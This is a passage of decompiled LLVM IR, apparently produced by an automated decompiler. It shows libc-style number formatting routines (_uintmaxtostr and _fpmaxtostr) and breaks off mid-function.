  store i32 %v4_8051f1d, i32* %ebx.global-to-local, align 4
  %v4_8051f21 = trunc i32 %tmp4 to i16
  %v6_8051f29 = icmp eq i32 %tmp6, 256
  %v1_8051f2f = icmp eq i1 %v6_8051f29, false
  br i1 %v1_8051f2f, label %dec_label_pc_8051f35, label %dec_label_pc_8051f31

dec_label_pc_8051f31:                             ; preds = %entry
  %v2_8051f31 = trunc i32 %tmp4 to i8
  %v4_8051f31 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8051f31, i8* %v4_8051f31, align 1
  br label %dec_label_pc_8051f53

dec_label_pc_8051f35:                             ; preds = %entry
  %v6_8051f35 = icmp eq i32 %tmp6, 2048
  %v1_8051f3b = icmp eq i1 %v6_8051f35, false
  br i1 %v1_8051f3b, label %dec_label_pc_8051f44, label %dec_label_pc_8051f3d

dec_label_pc_8051f3d:                             ; preds = %dec_label_pc_8051f35
  %sext2 = mul i32 %tmp4, 65536
  %v1_8051f3d = sdiv i32 %sext2, 65536
  %v3_8051f3d = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051f3d, i32* %v3_8051f3d, align 4
  %v0_8051f3f = load i32, i32* %edx.global-to-local, align 4
  %v1_8051f3f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051f3f = add i32 %v1_8051f3f, 4
  %v3_8051f3f = inttoptr i32 %v2_8051f3f to i32*
  store i32 %v0_8051f3f, i32* %v3_8051f3f, align 4
  br label %dec_label_pc_8051f53

dec_label_pc_8051f44:                             ; preds = %dec_label_pc_8051f35
  %v6_8051f44 = icmp eq i32 %tmp6, 512
  %v1_8051f4a = icmp eq i1 %v6_8051f44, false
  br i1 %v1_8051f4a, label %dec_label_pc_8051f51, label %dec_label_pc_8051f4c

dec_label_pc_8051f4c:                             ; preds = %dec_label_pc_8051f44
  store i16 %v4_8051f21, i16* %tmp5, align 2
  br label %dec_label_pc_8051f53

dec_label_pc_8051f51:                             ; preds = %dec_label_pc_8051f44
  %sext3 = mul i32 %tmp4, 65536
  %v1_8051f51 = sdiv i32 %sext3, 65536
  %v3_8051f51 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051f51, i32* %v3_8051f51, align 4
  br label %dec_label_pc_8051f53

dec_label_pc_8051f53:                             ; preds = %dec_label_pc_8051f4c, %dec_label_pc_8051f3d, %dec_label_pc_8051f31, %dec_label_pc_8051f51
  %v2_8051f53 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f53, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8051f54 = sdiv i32 %sext, 65536
  ret i32 %v1_8051f54

; uselistorder directives
  uselistorder label %dec_label_pc_8051f53, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8051f63 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051f63, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8051f6f = icmp slt i32 %arg4, 0
  %v1_8051f71 = icmp eq i1 %v2_8051f6f, false
  br i1 %v1_8051f71, label %dec_label_pc_8051f92, label %dec_label_pc_8051f73

dec_label_pc_8051f73:                             ; preds = %entry
  %v1_8051f73 = sub i32 0, %arg4
  store i32 %v1_8051f73, i32* %esi.global-to-local, align 4
  %v2_8051f75 = icmp slt i32 %arg3, 0
  %v1_8051f77 = icmp eq i1 %v2_8051f75, false
  br i1 %v1_8051f77, label %dec_label_pc_8051f92, label %dec_label_pc_8051f79

dec_label_pc_8051f79:                             ; preds = %dec_label_pc_8051f73
  %v1_8051f79 = sub i32 0, %arg2
  %v5_8051f79 = icmp ne i32 %arg2, 0
  store i32 %v1_8051f79, i32* %ecx.global-to-local, align 4
  %v2_8051f7b = zext i1 %v5_8051f79 to i32
  %v3_8051f7b = add i32 %v2_8051f7b, %arg3
  %v1_8051f86 = sub i32 0, %v3_8051f7b
  store i32 %v1_8051f86, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %entry, %dec_label_pc_8051f73, %dec_label_pc_8051f79
  %v0_8051f97 = phi i32 [ %v1_8051f73, %dec_label_pc_8051f79 ], [ %v1_8051f73, %dec_label_pc_8051f73 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8051f79 ], [ 0, %dec_label_pc_8051f73 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8051f97
  %tmp35 = urem i32 -1, %v0_8051f97
  %v1_8051f99 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8051f9d = load i32, i32* %esi.global-to-local, align 4
  %v12_8051f9d = icmp eq i32 %v1_8051f99, %v1_8051f9d
  %v1_8051fa7 = icmp eq i1 %v12_8051f9d, false
  br i1 %v1_8051fa7, label %dec_label_pc_8051fb6, label %dec_label_pc_8051fa9

dec_label_pc_8051fa9:                             ; preds = %dec_label_pc_8051f92
  %v1_8051fa9 = add i32 %div, 1
  br label %dec_label_pc_8051fb6

dec_label_pc_8051fb6:                             ; preds = %dec_label_pc_8051f92, %dec_label_pc_8051fa9
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051f99, %dec_label_pc_8051f92 ], [ 0, %dec_label_pc_8051fa9 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8051f92 ], [ %v1_8051fa9, %dec_label_pc_8051fa9 ]
  %v0_8051fb6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051fb6, i32* %ebp.global-to-local, align 4
  %v0_8051fb8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051fb8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051fbe

dec_label_pc_8051fbe:                             ; preds = %dec_label_pc_8051ffd, %dec_label_pc_8051fb6
  %v0_8051ff5 = phi i32 [ %v0_805200e, %dec_label_pc_8051ffd ], [ %v0_8051fb6, %dec_label_pc_8051fb6 ]
  %v0_8051fc2 = phi i32 [ %v1_8052010, %dec_label_pc_8051ffd ], [ %v0_8051fb8, %dec_label_pc_8051fb6 ]
  %v1_8051fbe = icmp eq i32 %v0_8051fc2, 0
  br i1 %v1_8051fbe, label %dec_label_pc_8051ff5, label %dec_label_pc_8051fc2

dec_label_pc_8051fc2:                             ; preds = %dec_label_pc_8051fbe
  %v0_8051fc6 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8051fc2, %v0_8051fc6
  %tmp36 = urem i32 %v0_8051fc2, %v0_8051fc6
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8051ff5, %v0_8051fc6
  %tmp37 = urem i32 %v0_8051ff5, %v0_8051fc6
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8051fd9 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8051fdd = add i32 %tmp37, %v6_8051fd9
  %v8_8051fe3 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8051fe8 = add i32 %div8, %v8_8051fe3
  store i32 %v2_8051fe8, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8051fdd, %v0_8051fc6
  %tmp38 = urem i32 %v2_8051fdd, %v0_8051fc6
  %v2_8051ff0 = add i32 %div9, %v2_8051fe8
  br label %dec_label_pc_8051ffd

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fbe
  %v0_8051ff9 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8051ff5, %v0_8051ff9
  %tmp39 = urem i32 %v0_8051ff5, %v0_8051ff9
  br label %dec_label_pc_8051ffd

dec_label_pc_8051ffd:                             ; preds = %dec_label_pc_8051fc2, %dec_label_pc_8051ff5
  %v0_8052003 = phi i32 [ %tmp38, %dec_label_pc_8051fc2 ], [ %tmp39, %dec_label_pc_8051ff5 ]
  %storemerge = phi i32 [ %v2_8051ff0, %dec_label_pc_8051fc2 ], [ %div12, %dec_label_pc_8051ff5 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8051ffd = load i32, i32* %edi.global-to-local, align 4
  %v1_8051ffd = add i32 %v0_8051ffd, -1
  store i32 %v1_8051ffd, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8052003, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8052003
  %v8_8052003 = trunc i32 %storemerge14.in to i8
  %v3_805200c = inttoptr i32 %v1_8051ffd to i8*
  store i8 %v8_8052003, i8* %v3_805200c, align 1
  %v0_805200e = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052010 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052010 = or i32 %v1_8052010, %v0_805200e
  %v3_8052010 = icmp eq i32 %v2_8052010, 0
  %v1_8052012 = icmp eq i1 %v3_8052010, false
  br i1 %v1_8052012, label %dec_label_pc_8051fbe, label %dec_label_pc_8052014

dec_label_pc_8052014:                             ; preds = %dec_label_pc_8051ffd
  %v4_8052014 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8052014, label %dec_label_pc_805201f, label %dec_label_pc_805201b

dec_label_pc_805201b:                             ; preds = %dec_label_pc_8052014
  %v0_805201b = load i32, i32* %edi.global-to-local, align 4
  %v1_805201b = add i32 %v0_805201b, -1
  store i32 %v1_805201b, i32* %edi.global-to-local, align 4
  %v1_805201c = inttoptr i32 %v1_805201b to i8*
  store i8 45, i8* %v1_805201c, align 1
  br label %dec_label_pc_805201f

dec_label_pc_805201f:                             ; preds = %dec_label_pc_8052014, %dec_label_pc_805201b
  %v0_8052022 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052022

; uselistorder directives
  uselistorder i32 %v2_8051fdd, { 1, 0 }
  uselistorder i32 %v0_8051fc6, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8051fc2, { 1, 0, 2 }
  uselistorder i32 %v0_8051ff5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051f97, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805201f, { 1, 0 }
  uselistorder label %dec_label_pc_8051ffd, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8051f92, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805202d = load i32, i32* @edi, align 4
  %v0_805202e = load i32, i32* @esi, align 4
  %v0_805202f = load i32, i32* @ebx, align 4
  store i32 %v0_805202f, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8052044 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8052044 = add i3 %v4_8052044, -1
  store i3 %v5_8052044, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805204b = add i32 %tmp112, 4
  %v2_805204b = inttoptr i32 %v1_805204b to i32*
  %v3_805204b = load i32, i32* %v2_805204b, align 4
  store i32 %v3_805204b, i32* %eax.global-to-local, align 4
  %v1_8052052 = add i32 %tmp112, 8
  %v2_8052052 = inttoptr i32 %v1_8052052 to i8*
  %v3_8052052 = load i8, i8* %v2_8052052, align 1
  %v4_8052052 = zext i8 %v3_8052052 to i32
  %v5_8052052 = load i32, i32* @ecx, align 4
  %v6_8052052 = and i32 %v5_8052052, -256
  %v7_8052052 = or i32 %v6_8052052, %v4_8052052
  store i32 %v7_8052052, i32* %ecx.global-to-local, align 4
  %v1_8052055 = inttoptr i32 %tmp112 to i32*
  %v2_8052055 = load i32, i32* %v1_8052055, align 4
  store i32 %v2_8052055, i32* %ebp.global-to-local, align 4
  %v3_8052057 = and i32 %v3_805204b, -256
  %v4_8052057 = or i32 %v3_8052057, %v4_8052052
  %v1_805205d = or i32 %v4_8052057, 32
  %v3_805205d = trunc i32 %v1_805205d to i8
  store i32 %v1_805205d, i32* %eax.global-to-local, align 4
  %v10_8052068 = icmp eq i8 %v3_805205d, 97
  %v1_805206a = icmp eq i1 %v10_8052068, false
  br i1 %v1_805206a, label %dec_label_pc_8052073, label %dec_label_pc_805206c

dec_label_pc_805206c:                             ; preds = %entry
  %v1_805206c = add i32 %v7_8052052, 6
  %v11_805206c = trunc i32 %v1_805206c to i8
  store i32 %v1_805206c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052073

dec_label_pc_8052073:                             ; preds = %entry, %dec_label_pc_805206c
  %stack_var_-206.0 = phi i8 [ %v3_8052052, %entry ], [ %v11_805206c, %dec_label_pc_805206c ]
  %v2_8052073 = icmp slt i32 %v2_8052055, 0
  %v1_8052075 = icmp eq i1 %v2_8052073, false
  br i1 %v1_8052075, label %dec_label_pc_805207c, label %dec_label_pc_8052077

dec_label_pc_8052077:                             ; preds = %dec_label_pc_8052073
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805207c

dec_label_pc_805207c:                             ; preds = %dec_label_pc_8052073, %dec_label_pc_8052077
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805208b = add i32 %tmp112, 12
  %v2_805208b = inttoptr i32 %v1_805208b to i32*
  %v3_805208b = load i32, i32* %v2_805208b, align 4
  store i32 %v3_805208b, i32* %eax.global-to-local, align 4
  %v2_805208e = and i32 %v3_805208b, 2
  %v3_805208e = icmp eq i32 %v2_805208e, 0
  br i1 %v3_805208e, label %dec_label_pc_805209c, label %dec_label_pc_80520a8

dec_label_pc_805209c:                             ; preds = %dec_label_pc_805207c
  %v2_805209c = urem i32 %v3_805208b, 2
  %tmp143 = trunc i32 %v2_805209c to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_80520a8

dec_label_pc_80520a8:                             ; preds = %dec_label_pc_805209c, %dec_label_pc_805207c
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_805207c ], [ %tmp144, %dec_label_pc_805209c ]
  %v1_80520bc = udiv i32 %v3_805208b, 256
  %tmp146 = and i32 %v1_80520bc, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_805220e, label %dec_label_pc_805212e

dec_label_pc_805212e:                             ; preds = %dec_label_pc_80520a8
  store i3 %v4_8052044, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8052135 = add i32 %tmp112, 16
  %v2_8052135 = inttoptr i32 %v1_8052135 to i32*
  store i32 32, i32* %v2_8052135, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_805214c = add i8 %stack_var_-206.0, -96
  %v6_805214c = sub i8 95, %stack_var_-206.0
  %v7_805214c = and i8 %v6_805214c, %stack_var_-206.0
  %v8_805214c = icmp slt i8 %v7_805214c, 0
  %v9_805214c = icmp eq i8 %v4_805214c, 0
  %v10_805214c = icmp slt i8 %v4_805214c, 0
  %v3_8052151 = icmp eq i1 %v10_805214c, %v8_805214c
  %v4_8052151 = icmp eq i1 %v9_805214c, false
  %v5_8052151 = and i1 %v4_8052151, %v3_8052151
  br i1 %v5_8052151, label %dec_label_pc_8052158, label %dec_label_pc_8052153

dec_label_pc_8052153:                             ; preds = %dec_label_pc_805212e
  br label %dec_label_pc_8052158

dec_label_pc_8052158:                             ; preds = %dec_label_pc_805212e, %dec_label_pc_8052153
  %v2_8052160 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052160, i32* @ecx, align 4
  br label %dec_label_pc_8052533

dec_label_pc_805220e:                             ; preds = %dec_label_pc_80520a8
  %v1_80520cd = add i3 %v4_8052044, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_8052212 = and i32 %v3_805208b, -65536
  %v2_8052217 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8052217, i32* %edx.global-to-local, align 4
  %v1_805221e = udiv i16 %tmp103, 256
  %v2_805221e = zext i16 %v1_805221e to i32
  %v3_805221e = mul nuw nsw i32 %v2_805221e, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_8052212.masked = zext i16 %tmp148 to i32
  %v11_805221e = or i32 %v4_8052212.masked, %v3_805221e
  %v10_805221e = or i32 %v11_805221e, %v6_8052212
  %v12_805221e = or i32 %v10_805221e, 3072
  store i32 %v12_805221e, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80520cd, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8052232

dec_label_pc_8052232:                             ; preds = %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge, %dec_label_pc_805220e
  %v2_805224f = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_805220e ], [ %v2_805224f.pre, %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge ]
  %v1_8052232 = phi i3 [ %v1_80520cd, %dec_label_pc_805220e ], [ %v1_8052232.pre, %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge ]
  %v3_8052259 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805220e ], [ %v0_8052232.pre, %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8052217, %dec_label_pc_805220e ], [ %v4_8052254, %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8052259 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_805224c = sitofp i32 %tmp149 to x86_fp80
  %v4_805224f = fsub x86_fp80 %v2_805224f, %v5_805224c
  store i3 %v1_8052232, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8052254 = add i32 %stack_var_-212.0, 9
  %v4_8052259 = fmul x86_fp80 %v3_8052259, %v4_805224f
  store x86_fp80 %v4_8052259, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805225b

dec_label_pc_805225b:                             ; preds = %dec_label_pc_805225b.dec_label_pc_805225b_crit_edge, %dec_label_pc_8052232
  %v0_805226d = phi i32 [ %v0_805226d.pre, %dec_label_pc_805225b.dec_label_pc_805225b_crit_edge ], [ %tmp149, %dec_label_pc_8052232 ]
  %v0_805225b = phi i32 [ %v0_805225b.pre, %dec_label_pc_805225b.dec_label_pc_805225b_crit_edge ], [ 0, %dec_label_pc_8052232 ]
  %v1_805225b = add i32 %v0_805225b, 1
  store i32 %v1_805225b, i32* %esi.global-to-local, align 4
  %v2_8052260 = sub i32 %v4_8052254, %v1_805225b
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_805226d, 10
  %tmp136 = urem i32 %v0_805226d, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052260, i32* %eax.global-to-local, align 4
  %v1_8052279 = or i32 %tmp136, 48
  %v8_8052279 = trunc i32 %v1_8052279 to i8
  store i32 %v1_8052279, i32* %edx.global-to-local, align 4
  %v3_805227f = inttoptr i32 %v2_8052260 to i8*
  store i8 %v8_8052279, i8* %v3_805227f, align 1
  %v7_8052281 = icmp sgt i32 %v1_805225b, 8
  br i1 %v7_8052281, label %dec_label_pc_8052283, label %dec_label_pc_805225b.dec_label_pc_805225b_crit_edge

dec_label_pc_805225b.dec_label_pc_805225b_crit_edge: ; preds = %dec_label_pc_805225b
  %v0_805225b.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_805226d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805225b

dec_label_pc_8052283:                             ; preds = %dec_label_pc_805225b
  %v0_8052283 = load i32, i32* @edi, align 4
  %v1_8052283 = add i32 %v0_8052283, 1
  store i32 %v1_8052283, i32* @edi, align 4
  %v7_8052287 = icmp sgt i32 %v1_8052283, 2
  br i1 %v7_8052287, label %dec_label_pc_8052289, label %dec_label_pc_8052283.dec_label_pc_8052232_crit_edge

dec_label_pc_8052283.dec_label_pc_8052232_crit_edge: ; preds = %dec_label_pc_8052283
  %v0_8052232.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8052232.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_805224f.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8052232

dec_label_pc_8052289:                             ; preds = %dec_label_pc_8052283
  %v0_8052289 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8052289 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8052289, x86_fp80* %st0.global-to-local, align 4
  %v2_805228b = add i3 %v0_8052289, 2
  store i3 %v2_805228b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805228d = add i8 %stack_var_-206.0, -96
  %v6_805228d = sub i8 95, %stack_var_-206.0
  %v7_805228d = and i8 %v6_805228d, %stack_var_-206.0
  %v8_805228d = icmp slt i8 %v7_805228d, 0
  %v9_805228d = icmp eq i8 %v4_805228d, 0
  %v10_805228d = icmp slt i8 %v4_805228d, 0
  %v3_8052292 = icmp eq i1 %v10_805228d, %v8_805228d
  %v4_8052292 = icmp eq i1 %v9_805228d, false
  %v5_8052292 = and i1 %v4_8052292, %v3_8052292
  br i1 %v5_8052292, label %dec_label_pc_80522a1, label %dec_label_pc_8052294

dec_label_pc_8052294:                             ; preds = %dec_label_pc_8052289
  %v4_8052294 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80522a1

dec_label_pc_80522a1:                             ; preds = %dec_label_pc_8052289, %dec_label_pc_8052294
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8052289 ], [ %v4_8052294, %dec_label_pc_8052294 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8052289 ], [ 69, %dec_label_pc_8052294 ]
  %v12_80522a1 = icmp eq i8 %stack_var_-206.1, 103
  %v1_80522a6 = icmp eq i1 %v12_80522a1, false
  br i1 %v1_80522a6, label %dec_label_pc_80522af, label %dec_label_pc_80522a8

dec_label_pc_80522a8:                             ; preds = %dec_label_pc_80522a1
  %v0_80522a8 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_80522a8, 1
  br i1 %tmp137, label %dec_label_pc_80522b6, label %dec_label_pc_80522ac

dec_label_pc_80522ac:                             ; preds = %dec_label_pc_80522a8
  %v1_80522ac = add i32 %v0_80522a8, -1
  store i32 %v1_80522ac, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80522b6

dec_label_pc_80522af:                             ; preds = %dec_label_pc_80522a1
  %v12_80522af = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_80522af, label %dec_label_pc_80522ba, label %dec_label_pc_80522af.dec_label_pc_80522b6_crit_edge

dec_label_pc_80522af.dec_label_pc_80522b6_crit_edge: ; preds = %dec_label_pc_80522af
  %v0_80522b6.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80522b6

dec_label_pc_80522b6:                             ; preds = %dec_label_pc_80522af.dec_label_pc_80522b6_crit_edge, %dec_label_pc_80522a8, %dec_label_pc_80522ac
  %v0_80522b6 = phi i32 [ %v0_80522b6.pre, %dec_label_pc_80522af.dec_label_pc_80522b6_crit_edge ], [ %v0_80522a8, %dec_label_pc_80522a8 ], [ %v1_80522ac, %dec_label_pc_80522ac ]
  store i32 %v0_80522b6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522e7

dec_label_pc_80522ba:                             ; preds = %dec_label_pc_80522af
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_80522be = load i32, i32* %ebp.global-to-local, align 4
  %v2_80522be = add i32 %v0_80522be, -1
  store i32 %v2_80522be, i32* %ebx.global-to-local, align 4
  %v5_80522c5 = icmp slt i32 %v2_80522be, -1
  br i1 %v5_80522c5, label %dec_label_pc_80522c7, label %dec_label_pc_80522e7

dec_label_pc_80522c7:                             ; preds = %dec_label_pc_80522ba
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80522cf = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80522cf, i32* %eax.global-to-local, align 4
  %v4_80522d7 = bitcast i32* %stack_var_-72 to i8*
  %v5_80522d7 = call i32 @__GI_memset(i8* %v4_80522d7, i32 48, i32 21)
  store i32 %v5_80522d7, i32* %eax.global-to-local, align 4
  %v0_80522f7.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522e7

dec_label_pc_80522e7:                             ; preds = %dec_label_pc_80522ba, %dec_label_pc_80522c7, %dec_label_pc_80522b6
  %v1_8052307 = phi i32 [ %v0_80522b6, %dec_label_pc_80522b6 ], [ %v0_80522f7.pr.pre, %dec_label_pc_80522c7 ], [ %v2_80522be, %dec_label_pc_80522ba ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_80522fa = icmp sgt i32 %v1_8052307, 20
  br i1 %v7_80522fa, label %dec_label_pc_80522fc, label %dec_label_pc_8052307

dec_label_pc_80522fc:                             ; preds = %dec_label_pc_80522e7
  %v2_80522fc = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_80522fc, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805231b.preheader

dec_label_pc_8052307:                             ; preds = %dec_label_pc_80522e7
  %v0_8052307 = load i32, i32* @esp, align 4
  %v2_8052307 = add i32 %v1_8052307, 165
  %v3_8052307 = add i32 %v2_8052307, %v0_8052307
  store i32 %v3_8052307, i32* %eax.global-to-local, align 4
  %v1_805230e = add i32 %v3_8052307, 2
  store i32 %v1_805230e, i32* %ecx.global-to-local, align 4
  %v2_8052311 = inttoptr i32 %v1_805230e to i8*
  %v3_8052311 = load i8, i8* %v2_8052311, align 1
  %v4_8052311 = add i8 %v3_8052311, -53
  %v9_8052311 = sub i8 52, %v3_8052311
  %v10_8052311 = and i8 %v9_8052311, %v3_8052311
  %v11_8052311 = icmp slt i8 %v10_8052311, 0
  %v13_8052311 = icmp slt i8 %v4_8052311, 0
  %v2_8052315 = icmp eq i1 %v13_8052311, %v11_8052311
  %v3_8052315 = zext i1 %v2_8052315 to i32
  br label %dec_label_pc_805231b.preheader

dec_label_pc_805231b.preheader:                   ; preds = %dec_label_pc_8052307, %dec_label_pc_80522fc
  %v0_805231b63 = phi i32 [ %v1_805230e, %dec_label_pc_8052307 ], [ %v2_80522fc, %dec_label_pc_80522fc ]
  %storemerge52 = phi i32 [ %v3_8052315, %dec_label_pc_8052307 ], [ 0, %dec_label_pc_80522fc ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805231b

dec_label_pc_805231b:                             ; preds = %dec_label_pc_805231b.backedge, %dec_label_pc_805231b.preheader
  %v3_805231c = phi i32 [ %v3_805231c.pre, %dec_label_pc_805231b.backedge ], [ %storemerge52, %dec_label_pc_805231b.preheader ]
  %v0_805231b = phi i32 [ %v0_805231e, %dec_label_pc_805231b.backedge ], [ %v0_805231b63, %dec_label_pc_805231b.preheader ]
  %v1_805231b = add i32 %v0_805231b, -1
  store i32 %v1_805231b, i32* %ecx.global-to-local, align 4
  %v1_805231c = inttoptr i32 %v1_805231b to i8*
  %v2_805231c = load i8, i8* %v1_805231c, align 1
  %v4_805231c = trunc i32 %v3_805231c to i8
  %v5_805231c = add i8 %v2_805231c, %v4_805231c
  store i8 %v5_805231c, i8* %v1_805231c, align 1
  %v0_805231e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805231e = inttoptr i32 %v0_805231e to i8*
  %v2_805231e = load i8, i8* %v1_805231e, align 1
